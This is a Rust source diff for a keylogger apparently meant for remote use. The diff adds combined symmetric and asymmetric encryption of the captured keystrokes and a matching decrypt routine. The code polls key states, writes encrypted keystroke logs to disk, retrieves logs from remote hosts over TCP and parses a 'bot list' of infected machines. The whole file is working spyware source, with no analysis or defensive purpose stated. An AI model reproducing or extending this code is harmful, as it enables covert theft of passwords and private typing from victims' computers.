@@ -16,6 +16,14 @@ use std::io::Read;
 use std::collections::HashMap;
 
 const LOG_LINE_LENGTH: usize = 140;
+const SEALBYTES: usize = 48;
+
+
+pub enum EncryptionType {
+    Symmetric(String),
+    Asymmetric(String),
+    Both { pub_key_loc: String, sym_key_loc: String },
+}
 
 //pub struct KeysInput<'a> {
 //    secret_key_path: &'a str,
@@ -23,7 +31,7 @@ const LOG_LINE_LENGTH: usize = 140;
 //    asymmetric: bool,
 //}
 
-pub fn key_log(key_path: &str, asym: bool) {
+pub fn key_log(encryption_type: &EncryptionType) {
 //    sodiumoxide::init();
 //    println!("{}", sodiumoxide::version::version_string());
 //    let (pub_key_1, sec_key_1) = box_::gen_keypair();
@@ -38,7 +46,7 @@ pub fn key_log(key_path: &str, asym: bool) {
 
     let mut key_downed: HashMap<u8, bool> = HashMap::new();
     loop {
-        std::thread::sleep(std::time::Duration::from_millis(10));
+        std::thread::sleep(std::time::Duration::from_millis(20));
         for i in 8..255u8 {
             let is_current_key_down: bool;
             let capslock_on: bool;
@@ -85,37 +93,43 @@ pub fn key_log(key_path: &str, asym: bool) {
                                           current_str.to_uppercase());
                     current_str += "\n";
                 }
-                save_string_to_queue(&current_str, &mut to_write_queue, key_path, asym)
+                save_string_to_queue(&current_str, &mut to_write_queue, encryption_type)
             }
         }
     }
 }
 
-fn save_string_to_queue(to_write: &String, string_queue: &mut String, key_loc: &str, asym: bool) {
+fn save_string_to_queue(to_write: &String, string_queue: &mut String, encryption_type: &EncryptionType) {
     if to_write.is_empty() { return; }
     string_queue.push_str(to_write);
 
     if string_queue.len() < 100 { return; }
     let string_queue_owned = pad(string_queue, LOG_LINE_LENGTH, '-', true);
     string_queue.clear();
-    save_encrypted_to_disk(if asym { encrypt_asym(&string_queue_owned, key_loc) } else { encrypt_sym(&string_queue_owned, key_loc) })
+    save_encrypted_to_disk(
+        match encryption_type {
+            &EncryptionType::Asymmetric(ref key_loc) => encrypt_asym(string_queue_owned.as_bytes(), &key_loc),
+            &EncryptionType::Symmetric(ref pub_key_loc) => encrypt_sym(string_queue_owned.as_bytes(), &pub_key_loc),
+            &EncryptionType::Both { ref pub_key_loc, ref sym_key_loc } => encrypt_asym(&encrypt_sym(string_queue_owned.as_bytes(), &sym_key_loc), &pub_key_loc)
+        })
 }
 
-fn encrypt_sym(string_queue_owned: &str, key_loc: &str) -> Vec<u8> {
+fn encrypt_sym(data_to_encrypt: &[u8], key_loc: &str) -> Vec<u8> {
     let (key, nonce) = generate_key_and_nonce(key_loc).expect("Key file incorrect");
     let mut output: Vec<u8> = nonce[..].to_vec();
-    output.extend(secretbox::seal(string_queue_owned.as_bytes(), &nonce, &key));
+    output.extend(secretbox::seal(data_to_encrypt, &nonce, &key));
     output
 }
 
-fn encrypt_asym(string_queue_owned: &str, key_loc: &str) -> Vec<u8> {
+fn encrypt_asym(data_to_encrypt: &[u8], key_loc: &str) -> Vec<u8> {
     let pub_key = get_public_key(key_loc).expect("Key file incorrect");
-    sealedbox::seal(string_queue_owned.as_bytes(), &pub_key)
+    sealedbox::seal(data_to_encrypt, &pub_key)
 }
 
 fn save_encrypted_to_disk(data_to_write: Vec<u8>) {
     let now = time::now();
     std::fs::create_dir("./logs").unwrap_or_default();
+
     let mut file = std::fs::OpenOptions::new()
         .write(true)
         .append(true)
@@ -188,6 +202,50 @@ pub fn generate_key_and_nonce(key_loc: &str) -> Result<(secretbox::Key, secretbo
     }
 }
 
+pub fn decrypt_asym_sym(log_file_path: &str, pub_key_path: &str, sec_key_path: &str, sym_key_path: &str) -> Result<(), Box<std::error::Error>> {
+    use std::io::Read;
+    use std::io::BufRead;
+
+    let (pub_key, sec_key, sym_key) = {
+        let mut pub_contents = Vec::new();
+        let mut sec_contents = Vec::new();
+        let mut sym_contents = Vec::new();
+        std::fs::File::open(pub_key_path)?.read_to_end(&mut pub_contents)?;
+        std::fs::File::open(sec_key_path)?.read_to_end(&mut sec_contents)?;
+        std::fs::File::open(sym_key_path)?.read_to_end(&mut sym_contents)?;
+        (box_::PublicKey::from_slice(&pub_contents[..(box_::PUBLICKEYBYTES)]).ok_or("Public key not the correct size")?,
+         box_::SecretKey::from_slice(&sec_contents[..(box_::SECRETKEYBYTES)]).ok_or("Private key not the correct size")?,
+         secretbox::Key::from_slice(&sym_contents[..(secretbox::KEYBYTES)]).ok_or("Symmetric key not the correct size")?)
+    };
+
+    let mut log_file = std::io::BufReader::with_capacity(
+        LOG_LINE_LENGTH + secretbox::MACBYTES + secretbox::NONCEBYTES + SEALBYTES,
+        std::fs::File::open(&log_file_path).expect("Log file not found"));
+
+    println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
+    println!("\n    Now reading from: {}\n", log_file_path);
+    println!("{}\n", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
+
+    loop {
+        let buffer_length = {
+            let data = log_file.fill_buf().expect("Read buffer failed");
+            if data.len() == 0 { break; }
+
+            let first_answer = sealedbox::open(data, &pub_key, &sec_key).expect("Decrypt fail");
+
+            let nonce = secretbox::Nonce::from_slice(&first_answer[..secretbox::NONCEBYTES]).expect("Nonce parse fail");
+            let final_answer = secretbox::open(&first_answer[secretbox::NONCEBYTES..], &nonce, &sym_key).expect("Decrypt fail");
+            let final_answer = String::from_utf8(final_answer).expect("Utf8 parse problem");
+
+            println!("{}", final_answer);
+            data.len()
+        };
+        log_file.consume(buffer_length);
+    }
+    println!("\n{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
+    Ok(())
+}
+
 pub fn decrypt_asym(log_file_path: &str, pub_key_path: &str, sec_key_path: &str) -> Result<(), Box<std::error::Error>> {
     use std::io::Read;
     use std::io::BufRead;
@@ -201,7 +259,7 @@ pub fn decrypt_asym(log_file_path: &str, pub_key_path: &str, sec_key_path: &str)
          box_::SecretKey::from_slice(&sec_contents[..(box_::SECRETKEYBYTES)]).ok_or("Private key not the correct size")?)
     };
 
-    let mut log_file = std::io::BufReader::with_capacity(LOG_LINE_LENGTH + 48, std::fs::File::open(&log_file_path).expect("Log file not found"));
+    let mut log_file = std::io::BufReader::with_capacity(LOG_LINE_LENGTH + SEALBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));
 
     println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
     println!("\n    Now reading from: {}\n", log_file_path);
@@ -274,6 +332,7 @@ pub fn load_key_logs(log_file_path: &str) -> Result<Vec<u8>, Box<std::error::Err
 }
 
 pub fn retrieve_remote_keylogs(addr: &str) -> Vec<(String, Vec<u8>)> {
+    println!("{}", addr);
     let mut stream = std::net::TcpStream::connect(addr).expect("Error connecting");
     let mut data = Vec::new();
 
@@ -297,7 +356,6 @@ pub fn retrieve_remote_keylogs(addr: &str) -> Vec<(String, Vec<u8>)> {
 
 
 pub fn parse_bot_list(bot_list_path: &str) -> Result<Vec<String>, Box<std::error::Error>> {
-    println!("{}", secretbox::MACBYTES);
     let mut list_data = String::new();
     std::fs::File::open(bot_list_path)?.read_to_string(&mut list_data)?;
     Ok(list_data.split("\n").map(|s: &str| s.trim().to_owned()).collect::<Vec<String>>())
